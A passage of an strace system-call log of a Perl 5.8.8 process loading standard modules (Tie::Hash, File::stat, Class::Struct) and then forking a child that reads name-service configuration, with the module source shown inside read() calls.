}\n\n=head1 DESCRIPTION\n\nThe C<IO::Dir> package provides two interfaces to perl\'s directory reading\nroutines.\n\nThe first interface is an object approach. C<IO::Dir> provides an object\nconstructor and methods, which are just wrappers around perl\'s built in\ndirectory reading routines.\n\n=over 4\n\n=item new ( [ DIRNAME ] )\n\nC<new> is the constructor for C<IO::Dir> objects. It accepts one optional\nargument which,  if given, C<new> will pass to C<open>\n\n=back\n\nThe following methods are wrappers for the directory related functions built\ninto perl (the trailing `dir\' has been removed from the names). See L<perlfunc>\nfor details of these functions.\n\n=over 4\n\n=item open ( DIRNAME )\n\n=item read ()\n\n=item seek ( POS )\n\n=item tell ()\n\n=item rewind ()\n\n=item close ()\n\n=back\n\nC<IO::Dir> also provides an interface to reading directories via a tied\nhash. The tied hash extends the interface beyond just the directory\nreading routines by the use of C<lstat>, from the C<File::stat> package,\nC<unlin", 4096) = 4096
19001 12:57:07.424739 stat64("/etc/perl/Tie/Hash.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.424757 stat64("/etc/perl/Tie/Hash.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.424771 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.424783 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.424797 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.424810 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.424823 stat64("/usr/lib/perl5/Tie/Hash.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.424835 stat64("/usr/lib/perl5/Tie/Hash.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.424848 stat64("/usr/share/perl5/Tie/Hash.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.424860 stat64("/usr/share/perl5/Tie/Hash.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.424873 stat64("/usr/lib/perl/5.8/Tie/Hash.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.424885 stat64("/usr/lib/perl/5.8/Tie/Hash.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.424898 stat64("/usr/share/perl/5.8/Tie/Hash.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.424911 stat64("/usr/share/perl/5.8/Tie/Hash.pm", {st_mode=S_IFREG|0644, st_size=7304, ...}) = 0
19001 12:57:07.424932 open("/usr/share/perl/5.8/Tie/Hash.pm", O_RDONLY|O_LARGEFILE) = 9
19001 12:57:07.424947 ioctl(9, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8e36a8) = -1 ENOTTY (Inappropriate ioctl for device)
19001 12:57:07.424958 _llseek(9, 0, [0], SEEK_CUR) = 0
19001 12:57:07.424976 read(9, "package Tie::Hash;\n\nour $VERSION = \'1.02\';\n\n=head1 NAME\n\nTie::Hash, Tie::StdHash, Tie::ExtraHash - base class definitions for tied hashes\n\n=head1 SYNOPSIS\n\n    package NewHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::Hash);\n\n    sub DELETE { ... }\t\t# Provides needed method\n    sub CLEAR { ... }\t\t# Overrides inherited method\n\n\n    package NewStdHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::StdHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0]};\n    # TIEHASH should return a reference to the actual storage\n    sub DELETE { ... }\n\n    package NewExtraHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::ExtraHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0][0]};\n    # TIEHASH should return an array reference with the first element being\n    # the reference to the actual storage \n    sub DELETE { \n      $_[0][1]->(\'del\', $_[0][0], $_[1]); # Call the report writer\n      delete $_[0][0]->{$_[1]};\t\t  #  $_[0]->SUPER::DELETE($_[1])\n    }\n\n\n    package main;\n\n    tie %new_hash, \'NewHash\';\n    tie %new_std_hash, \'NewStdHash\';\n    tie %new_extra_hash, \'NewExtraHash\',\n\tsub {warn \"Doing \\U$_[1]\\E of $_[2].\\n\"};\n\n=head1 DESCRIPTION\n\nThis module provides some skeletal methods for hash-tying classes. See\nL<perltie> for a list of the functions required in order to tie a hash\nto a package. The basic B<Tie::Hash> package provides a C<new> method, as well\nas methods C<TIEHASH>, C<EXISTS> and C<CLEAR>. The B<Tie::StdHash> and\nB<Tie::ExtraHash> packages\nprovide most methods for hashes described in L<perltie> (the exceptions\nare C<UNTIE> and C<DESTROY>).  They cause tied hashes to behave exactly like standard hashes,\nand allow for selective overwriting of methods.  B<Tie::Hash> grandfathers the\nC<new> method: it is used if C<TIEHASH> is not defined\nin the case a class forgets to include a C<TIEHASH> method.\n\nFor developers wishing to write their own tied hashes, the required methods\nare briefly defined below. See the L<perltie> section for more detailed\ndescriptive, as well as example code:\n\n=over 4\n\n=item TIEHASH classname, LIST\n\nThe method invoked by the command C<tie %hash, classname>. Associates a new\nhash instance with the specified class. C<LIST> would represent additional\narguments (along the lines of L<AnyDBM_File> and compatriots) needed to\ncomplete the association.\n\n=item STORE this, key, value\n\nStore datum I<value> into I<key> for the tied hash I<this>.\n\n=item FETCH this, key\n\nRetrieve the datum in I<key> for the tied hash I<this>.\n\n=item FIRSTKEY this\n\nReturn the first key in the hash.\n\n=item NEXTKEY this, lastkey\n\nReturn the next key in the hash.\n\n=item EXISTS this, key\n\nVerify that I<key> exists with the tied hash I<this>.\n\nThe B<Tie::Hash> implementation is a stub that simply croaks.\n\n=item DELETE this, key\n\nDelete the key I<key> from the tied hash I<this>.\n\n=item CLEAR this\n\nClear all values from the tied hash I<this>.\n\n=item SCALAR this\n\nReturns what evaluating the hash in scalar context yields.\n\nB<Tie::Hash> does not implement this method (but B<Tie::StdHash>\nand B<Tie::ExtraHash> do).\n\n=back\n\n=head1 Inheriting from B<Tie::StdHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<tied(%tiedhash)>.  Thus overwritten\nC<TIEHASH> method should return a hash reference, and the remaining methods\nshould operate on the hash referenced by the first argument:\n\n  package ReportHash;\n  our @ISA = \'Tie::StdHash\';\n\n  sub TIEHASH  {\n    my $storage = bless {}, shift;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0]{$_[1]} = $_[2]\n  }\n\n\n=head1 Inheriting from B<Tie::ExtraHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<(tied(%tiedhash))-E<gt>[0]>.  Thus overwritten\nC<TIEHASH> method should return an array reference with the first\nelement being a hash refer", 4096) = 4096
19001 12:57:07.425375 read(9, "ence, and the remaining methods should operate on the\nhash C<< %{ $_[0]->[0] } >>:\n\n  package ReportHash;\n  our @ISA = \'Tie::ExtraHash\';\n\n  sub TIEHASH  {\n    my $class = shift;\n    my $storage = bless [{}, @_], $class;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage;\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0][0]{$_[1]} = $_[2]\n  }\n\nThe default C<TIEHASH> method stores \"extra\" arguments to tie() starting\nfrom offset 1 in the array referenced by C<tied(%tiedhash)>; this is the\nsame storage algorithm as in TIEHASH subroutine above.  Hence, a typical\npackage inheriting from B<Tie::ExtraHash> does not need to overwrite this\nmethod.\n\n=head1 C<SCALAR>, C<UNTIE> and C<DESTROY>\n\nThe methods C<UNTIE> and C<DESTROY> are not defined in B<Tie::Hash>,\nB<Tie::StdHash>, or B<Tie::ExtraHash>.  Tied hashes do not require\npresence of these methods, but if defined, the methods will be called in\nproper time, see L<perltie>.\n\nC<SCALAR> is only defined in B<Tie::StdHash> and B<Tie::ExtraHash>.\n\nIf needed, these methods should be defined by the package inheriting from\nB<Tie::Hash>, B<Tie::StdHash>, or B<Tie::ExtraHash>. See L<pertie/\"SCALAR\">\nto find out what happens when C<SCALAR> does not exist.\n\n=head1 MORE INFORMATION\n\nThe packages relating to various DBM-related implementations (F<DB_File>,\nF<NDBM_File>, etc.) show examples of general tied hashes, as does the\nL<Config> module. While these do not utilize B<Tie::Hash>, they serve as\ngood working examples.\n\n=cut\n\nuse Carp;\nuse warnings::register;\n\nsub new {\n    my $pkg = shift;\n    $pkg->TIEHASH(@_);\n}\n\n# Grandfather \"new\"\n\nsub TIEHASH {\n    my $pkg = shift;\n    if (defined &{\"${pkg}::new\"}) {\n\twarnings::warnif(\"WARNING: calling ${pkg}->new since ${pkg}->TIEHASH is missing\");\n\t$pkg->new(@_);\n    }\n    else {\n\tcroak \"$pkg doesn\'t define a TIEHASH method\";\n    }\n}\n\nsub EXISTS {\n    my $pkg = ref $_[0];\n    croak \"$pkg doesn\'t define an EXISTS method\";\n}\n\nsub CLEAR {\n    my $self = shift;\n    my $key = $self->FIRSTKEY(@_);\n    my @keys;\n\n    while (defined $key) {\n\tpush @keys, $key;\n\t$key = $self->NEXTKEY(@_, $key);\n    }\n    foreach $key (@keys) {\n\t$self->DELETE(@_, $key);\n    }\n}\n\n# The Tie::StdHash package implements standard perl hash behaviour.\n# It exists to act as a base class for classes which only wish to\n# alter some parts of their behaviour.\n\npackage Tie::StdHash;\n# @ISA = qw(Tie::Hash);\t\t# would inherit new() only\n\nsub TIEHASH  { bless {}, $_[0] }\nsub STORE    { $_[0]->{$_[1]} = $_[2] }\nsub FETCH    { $_[0]->{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0]}; each %{$_[0]} }\nsub NEXTKEY  { each %{$_[0]} }\nsub EXISTS   { exists $_[0]->{$_[1]} }\nsub DELETE   { delete $_[0]->{$_[1]} }\nsub CLEAR    { %{$_[0]} = () }\nsub SCALAR   { scalar %{$_[0]} }\n\npackage Tie::ExtraHash;\n\nsub TIEHASH  { my $p = shift; bless [{}, @_], $p }\nsub STORE    { $_[0][0]{$_[1]} = $_[2] }\nsub FETCH    { $_[0][0]{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0][0]}; each %{$_[0][0]} }\nsub NEXTKEY  { each %{$_[0][0]} }\nsub EXISTS   { exists $_[0][0]->{$_[1]} }\nsub DELETE   { delete $_[0][0]->{$_[1]} }\nsub CLEAR    { %{$_[0][0]} = () }\nsub SCALAR   { scalar %{$_[0][0]} }\n\n1;\n", 4096) = 3208
19001 12:57:07.425919 read(9, "", 4096) = 0
19001 12:57:07.425935 close(9)          = 0
19001 12:57:07.425966 stat64("/etc/perl/File/stat.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.425981 stat64("/etc/perl/File/stat.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.425995 stat64("/usr/local/lib/perl/5.8.8/File/stat.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.426008 stat64("/usr/local/lib/perl/5.8.8/File/stat.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.426021 stat64("/usr/local/share/perl/5.8.8/File/stat.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.426034 stat64("/usr/local/share/perl/5.8.8/File/stat.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.426048 stat64("/usr/lib/perl5/File/stat.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.426060 stat64("/usr/lib/perl5/File/stat.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.426073 stat64("/usr/share/perl5/File/stat.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.426113 stat64("/usr/share/perl5/File/stat.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.426129 stat64("/usr/lib/perl/5.8/File/stat.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.426156 stat64("/usr/lib/perl/5.8/File/stat.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.426170 stat64("/usr/share/perl/5.8/File/stat.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.426182 stat64("/usr/share/perl/5.8/File/stat.pm", {st_mode=S_IFREG|0644, st_size=3372, ...}) = 0
19001 12:57:07.426203 open("/usr/share/perl/5.8/File/stat.pm", O_RDONLY|O_LARGEFILE) = 9
19001 12:57:07.426218 ioctl(9, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8e36a8) = -1 ENOTTY (Inappropriate ioctl for device)
19001 12:57:07.426229 _llseek(9, 0, [0], SEEK_CUR) = 0
19001 12:57:07.426246 read(9, "package File::stat;\nuse 5.006;\n\nuse strict;\nuse warnings;\n\nour(@EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n\nour $VERSION = \'1.00\';\n\nBEGIN { \n    use Exporter   ();\n    @EXPORT      = qw(stat lstat);\n    @EXPORT_OK   = qw( $st_dev\t   $st_ino    $st_mode \n\t\t       $st_nlink   $st_uid    $st_gid \n\t\t       $st_rdev    $st_size \n\t\t       $st_atime   $st_mtime  $st_ctime \n\t\t       $st_blksize $st_blocks\n\t\t    );\n    %EXPORT_TAGS = ( FIELDS => [ @EXPORT_OK, @EXPORT ] );\n}\nuse vars @EXPORT_OK;\n\n# Class::Struct forbids use of @ISA\nsub import { goto &Exporter::import }\n\nuse Class::Struct qw(struct);\nstruct \'File::stat\' => [\n     map { $_ => \'$\' } qw{\n\t dev ino mode nlink uid gid rdev size\n\t atime mtime ctime blksize blocks\n     }\n];\n\nsub populate (@) {\n    return unless @_;\n    my $stob = new();\n    @$stob = (\n\t$st_dev, $st_ino, $st_mode, $st_nlink, $st_uid, $st_gid, $st_rdev,\n        $st_size, $st_atime, $st_mtime, $st_ctime, $st_blksize, $st_blocks ) \n\t    = @_;\n    return $stob;\n} \n\nsub lstat ($)  { populate(CORE::lstat(shift)) }\n\nsub stat ($) {\n    my $arg = shift;\n    my $st = populate(CORE::stat $arg);\n    return $st if $st;\n\tmy $fh;\n    {\n\t\tlocal $!;\n\t\tno strict \'refs\';\n\t\trequire Symbol;\n\t\t$fh = \\*{ Symbol::qualify( $arg, caller() )};\n\t\treturn unless defined fileno $fh;\n\t}\n    return populate(CORE::stat $fh);\n}\n\n1;\n__END__\n\n=head1 NAME\n\nFile::stat - by-name interface to Perl\'s built-in stat() functions\n\n=head1 SYNOPSIS\n\n use File::stat;\n $st = stat($file) or die \"No $file: $!\";\n if ( ($st->mode & 0111) && $st->nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n use File::stat qw(:FIELDS);\n stat($file) or die \"No $file: $!\";\n if ( ($st_mode & 0111) && $st_nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n=head1 DESCRIPTION\n\nThis module\'s default exports override the core stat() \nand lstat() functions, replacing them with versions that return \n\"File::stat\" objects.  This object has methods that\nreturn the similarly named structure field name from the\nstat(2) function; namely,\ndev,\nino,\nmode,\nnlink,\nuid,\ngid,\nrdev,\nsize,\natime,\nmtime,\nctime,\nblksize,\nand\nblocks.  \n\nYou may also import all the structure fields directly into your namespace\nas regular variables using the :FIELDS import tag.  (Note that this still\noverrides your stat() and lstat() functions.)  Access these fields as\nvariables named with a preceding C<st_> in front their method names.\nThus, C<$stat_obj-E<gt>dev()> corresponds to $st_dev if you import\nthe fields.\n\nTo access this functionality without the core overrides,\npass the C<use> an empty import list, and then access\nfunction functions with their full qualified names.\nOn the other hand, the built-ins are still available\nvia the C<CORE::> pseudo-package.\n\n=head1 BUGS\n\nAs of Perl 5.8.0 after using this module you cannot use the implicit\nC<$_> or the special filehandle C<_> with stat() or lstat(), trying\nto do so leads into strange errors.  The workaround is for C<$_> to\nbe explicit\n\n    my $stat_obj = stat $_;\n\nand for C<_> to explicitly populate the object using the unexported\nand undocumented populate() function with CORE::stat():\n\n    my $stat_obj = File::stat::populate(CORE::stat(_));\n\n=head1 NOTE\n\nWhile this class is currently implemented using the Class::Struct\nmodule to build a struct-like class, you shouldn\'t rely upon this.\n\n=head1 AUTHOR\n\nTom Christiansen\n", 4096) = 3372
19001 12:57:07.426678 stat64("/etc/perl/Class/Struct.pmc", 0xbf8e34dc) = -1 ENOENT (No such file or directory)
19001 12:57:07.438219 stat64("/etc/perl/Class/Struct.pm", 0xbf8e33ec) = -1 ENOENT (No such file or directory)
19001 12:57:07.438258 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pmc", 0xbf8e34dc) = -1 ENOENT (No such file or directory)
19001 12:57:07.438285 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pm", 0xbf8e33ec) = -1 ENOENT (No such file or directory)
19001 12:57:07.438311 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pmc", 0xbf8e34dc) = -1 ENOENT (No such file or directory)
19001 12:57:07.438326 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pm", 0xbf8e33ec) = -1 ENOENT (No such file or directory)
19001 12:57:07.438346 stat64("/usr/lib/perl5/Class/Struct.pmc", 0xbf8e34dc) = -1 ENOENT (No such file or directory)
19001 12:57:07.438358 stat64("/usr/lib/perl5/Class/Struct.pm", 0xbf8e33ec) = -1 ENOENT (No such file or directory)
19001 12:57:07.438372 stat64("/usr/share/perl5/Class/Struct.pmc", 0xbf8e34dc) = -1 ENOENT (No such file or directory)
19001 12:57:07.438384 stat64("/usr/share/perl5/Class/Struct.pm", 0xbf8e33ec) = -1 ENOENT (No such file or directory)
19001 12:57:07.438398 stat64("/usr/lib/perl/5.8/Class/Struct.pmc", 0xbf8e34dc) = -1 ENOENT (No such file or directory)
19001 12:57:07.438411 stat64("/usr/lib/perl/5.8/Class/Struct.pm", 0xbf8e33ec) = -1 ENOENT (No such file or directory)
19001 12:57:07.438425 stat64("/usr/share/perl/5.8/Class/Struct.pmc", 0xbf8e34dc) = -1 ENOENT (No such file or directory)
19001 12:57:07.438439 stat64("/usr/share/perl/5.8/Class/Struct.pm", {st_mode=S_IFREG|0644, st_size=20512, ...}) = 0
19001 12:57:07.438460 open("/usr/share/perl/5.8/Class/Struct.pm", O_RDONLY|O_LARGEFILE) = 10
19001 12:57:07.438476 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8e31f8) = -1 ENOTTY (Inappropriate ioctl for device)
19001 12:57:07.438487 _llseek(10, 0, [0], SEEK_CUR) = 0
19001 12:57:07.438508 read(10, "package Class::Struct;\n\n## See POD after __END__\n\nuse 5.006_001;\n\nuse strict;\nuse warnings::register;\nour(@ISA, @EXPORT, $VERSION);\n\nuse Carp;\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(struct);\n\n$VERSION = \'0.63\';\n\n## Tested on 5.002 and 5.003 without class membership tests:\nmy $CHECK_CLASS_MEMBERSHIP = ($] >= 5.003_95);\n\nmy $print = 0;\nsub printem {\n    if (@_) { $print = shift }\n    else    { $print++ }\n}\n\n{\n    package Class::Struct::Tie_ISA;\n\n    sub TIEARRAY {\n        my $class = shift;\n        return bless [], $class;\n    }\n\n    sub STORE {\n        my ($self, $index, $value) = @_;\n        Class::Struct::_subclass_error();\n    }\n\n    sub FETCH {\n        my ($self, $index) = @_;\n        $self->[$index];\n    }\n\n    sub FETCHSIZE {\n        my $self = shift;\n        return scalar(@$self);\n    }\n\n    sub DESTROY { }\n}\n\nsub import {\n    my $self = shift;\n\n    if ( @_ == 0 ) {\n      $self->export_to_level( 1, $self, @EXPORT );\n    } elsif ( @_ == 1 ) {\n\t# This is admittedly a little bit silly:\n\t# do we ever export anything else than \'struct\'...?\n      $self->export_to_level( 1, $self, @_ );\n    } else {\n      goto &struct;\n    }\n}\n\nsub struct {\n\n    # Determine parameter list structure, one of:\n    #   struct( class => [ element-list ])\n    #   struct( class => { element-list })\n    #   struct( element-list )\n    # Latter form assumes current package name as struct name.\n\n    my ($class, @decls);\n    my $base_type = ref $_[1];\n    if ( $base_type eq \'HASH\' ) {\n        $class = shift;\n        @decls = %{shift()};\n        _usage_error() if @_;\n    }\n    elsif ( $base_type eq \'ARRAY\' ) {\n        $class = shift;\n        @decls = @{shift()};\n        _usage_error() if @_;\n    }\n    else {\n        $base_type = \'ARRAY\';\n        $class = (caller())[0];\n        @decls = @_;\n    }\n\n    _usage_error() if @decls % 2 == 1;\n\n    # Ensure we are not, and will not be, a subclass.\n\n    my $isa = do {\n        no strict \'refs\';\n        \\@{$class . \'::ISA\'};\n    };\n    _subclass_error() if @$isa;\n    tie @$isa, \'Class::Struct::Tie_ISA\';\n\n    # Create constructor.\n\n    croak \"function \'new\' already defined in package $class\"\n        if do { no strict \'refs\'; defined &{$class . \"::new\"} };\n\n    my @methods = ();\n    my %refs = ();\n    my %arrays = ();\n    my %hashes = ();\n    my %classes = ();\n    my $got_class = 0;\n    my $out = \'\';\n\n    $out = \"{\\n  package $class;\\n  use Carp;\\n  sub new {\\n\";\n    $out .= \"    my (\\$class, \\%init) = \\@_;\\n\";\n    $out .= \"    \\$class = __PACKAGE__ unless \\@_;\\n\";\n\n    my $cnt = 0;\n    my $idx = 0;\n    my( $cmt, $name, $type, $elem );\n\n    if( $base_type eq \'HASH\' ){\n        $out .= \"    my(\\$r) = {};\\n\";\n        $cmt = \'\';\n    }\n    elsif( $base_type eq \'ARRAY\' ){\n        $out .= \"    my(\\$r) = [];\\n\";\n    }\n    while( $idx < @decls ){\n        $name = $decls[$idx];\n        $type = $decls[$idx+1];\n        push( @methods, $name );\n        if( $base_type eq \'HASH\' ){\n            $elem = \"{\'${class}::$name\'}\";\n        }\n        elsif( $base_type eq \'ARRAY\' ){\n            $elem = \"[$cnt]\";\n            ++$cnt;\n            $cmt = \" # $name\";\n        }\n        if( $type =~ /^\\*(.)/ ){\n            $refs{$name}++;\n            $type = $1;\n        }\n        my $init = \"defined(\\$init{\'$name\'}) ? \\$init{\'$name\'} :\";\n        if( $type eq \'@\' ){\n            $out .= \"    croak \'Initializer for $name must be array reference\'\\n\"; \n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'ARRAY\';\\n\";\n            $out .= \"    \\$r->$elem = $init [];$cmt\\n\"; \n            $arrays{$name}++;\n        }\n        elsif( $type eq \'%\' ){\n            $out .= \"    croak \'Initializer for $name must be hash reference\'\\n\";\n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'HASH\';\\n\";\n            $out .= \"    \\$r->$elem = $init {};$cmt\\n\";\n            $hashes{$name}++;\n        }\n        elsif ( $type eq \'$\') {\n            $out .= \"    \\$r->$elem = $init undef;$cmt\\n\";\n        }\n        elsif( $type =~ /^\\w+(?:::\\w+)*$/ ){\n            $out .= \"    if (defined(\\$init{\'$name\'}))", 4096) = 4096
19001 12:57:07.438919 brk(0x82de000)    = 0x82de000
19001 12:57:07.439322 read(10, " {\\n\";\n           $out .= \"       if (ref \\$init{\'$name\'} eq \'HASH\')\\n\";\n            $out .= \"            { \\$r->$elem = $type->new(\\%{\\$init{\'$name\'}}) } $cmt\\n\";\n           $out .= \"       elsif (UNIVERSAL::isa(\\$init{\'$name\'}, \'$type\'))\\n\";\n            $out .= \"            { \\$r->$elem = \\$init{\'$name\'} } $cmt\\n\";\n            $out .= \"       else { croak \'Initializer for $name must be hash or $type reference\' }\\n\";\n            $out .= \"    }\\n\";\n            $classes{$name} = $type;\n            $got_class = 1;\n        }\n        else{\n            croak \"\'$type\' is not a valid struct element type\";\n        }\n        $idx += 2;\n    }\n    $out .= \"    bless \\$r, \\$class;\\n  }\\n\";\n\n    # Create accessor methods.\n\n    my( $pre, $pst, $sel );\n    $cnt = 0;\n    foreach $name (@methods){\n        if ( do { no strict \'refs\'; defined &{$class . \"::$name\"} } ) {\n            warnings::warnif(\"function \'$name\' already defined, overrides struct accessor method\");\n        }\n        else {\n            $pre = $pst = $cmt = $sel = \'\';\n            if( defined $refs{$name} ){\n                $pre = \"\\\\(\";\n                $pst = \")\";\n                $cmt = \" # returns ref\";\n            }\n            $out .= \"  sub $name {$cmt\\n    my \\$r = shift;\\n\";\n            if( $base_type eq \'ARRAY\' ){\n                $elem = \"[$cnt]\";\n                ++$cnt;\n            }\n            elsif( $base_type eq \'HASH\' ){\n                $elem = \"{\'${class}::$name\'}\";\n            }\n            if( defined $arrays{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\"; \n                $out .= \"    if (ref(\\$i) eq \'ARRAY\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->[\\$i]\";\n            }\n            elsif( defined $hashes{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\";\n                $out .= \"    if (ref(\\$i) eq \'HASH\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->{\\$i}\";\n            }\n            elsif( defined $classes{$name} ){\n                if ( $CHECK_CLASS_MEMBERSHIP ) {\n                    $out .= \"    croak \'$name argument is wrong class\' if \\@_ && ! UNIVERSAL::isa(\\$_[0], \'$classes{$name}\');\\n\";\n                }\n            }\n            $out .= \"    croak \'Too many args to $name\' if \\@_ > 1;\\n\";\n            $out .= \"    \\@_ ? ($pre\\$r->$elem$sel = shift$pst) : $pre\\$r->$elem$sel$pst;\\n\";\n            $out .= \"  }\\n\";\n        }\n    }\n    $out .= \"}\\n1;\\n\";\n\n    print $out if $print;\n    my $result = eval $out;\n    carp $@ if $@;\n}\n\nsub _usage_error {\n    confess \"struct usage error\";\n}\n\nsub _subclass_error {\n    croak \'struct class cannot be a subclass (@ISA not allowed)\';\n}\n\n1; # for require\n\n\n__END__\n\n=head1 NAME\n\nClass::Struct - declare struct-like datatypes as Perl classes\n\n=head1 SYNOPSIS\n\n    use Class::Struct;\n            # declare struct, based on array:\n    struct( CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ]);\n            # declare struct, based on hash:\n    struct( CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... });\n\n    package CLASS_NAME;\n    use Class::Struct;\n            # declare struct, based on array, implicit class name:\n    struct( ELEMENT_NAME => ELEMENT_TYPE, ... );\n\n    # Declare struct at compile time\n    use Class::Struct CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ];\n    use Class::Struct CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... };\n\n    # declare struct at compile time, based on array, implicit class name:\n    package CLASS_NAME;\n    use Class::Struct ELEMENT_NAME => ELEMENT_TYPE, ... ;\n\n    package Myobj;\n    use Class::Struct;\n            # declare struct with four types of elements:\n    struct( s => \'$\', a => \'@\', h => \'%\', c => \'My_Other_Class\' );\n\n    $obj = new Myobj;               # constructor\n\n                                    # scalar type accessor:\n    $element_value = $obj->s;           # element value\n    $obj->s(\'new value\');               # assign to element\n\n                             ", 4096) = 4096
19001 12:57:07.439888 _llseek(10, 6916, [6916], SEEK_SET) = 0
19001 12:57:07.439905 _llseek(10, 0, [6916], SEEK_CUR) = 0
19001 12:57:07.439916 close(10)         = 0
19001 12:57:07.440093 _llseek(9, 1334, [1334], SEEK_SET) = 0
19001 12:57:07.440109 _llseek(9, 0, [1334], SEEK_CUR) = 0
19001 12:57:07.440120 close(9)          = 0
19001 12:57:07.440770 brk(0x82ff000)    = 0x82ff000
19001 12:57:07.440918 _llseek(7, 2689, [2689], SEEK_SET) = 0
19001 12:57:07.440935 _llseek(7, 0, [2689], SEEK_CUR) = 0
19001 12:57:07.440945 close(7)          = 0
19001 12:57:07.441094 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d1b908) = 19002
19002 12:57:07.457629 getppid()         = 19001
19002 12:57:07.457696 open("/etc/nsswitch.conf", O_RDONLY) = 7
19002 12:57:07.457721 fstat64(7, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
19002 12:57:07.457741 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ee1000
19002 12:57:07.457756 read(7, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
19002 12:57:07.457807 read(7, "", 4096) = 0
19002 12:57:07.457817 close(7)          = 0
19002 12:57:07.457828 munmap(0xb7ee1000, 4096) = 0
19002 12:57:07.457855 open("/etc/ld.so.cache", O_RDONLY) = 7
19002 12:57:07.457869 fstat64(7, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
19002 12:57:07.457886 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb7ce8000
19002 12:57:07.457898 close(7)          = 0
19002 12:57:07.457908 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
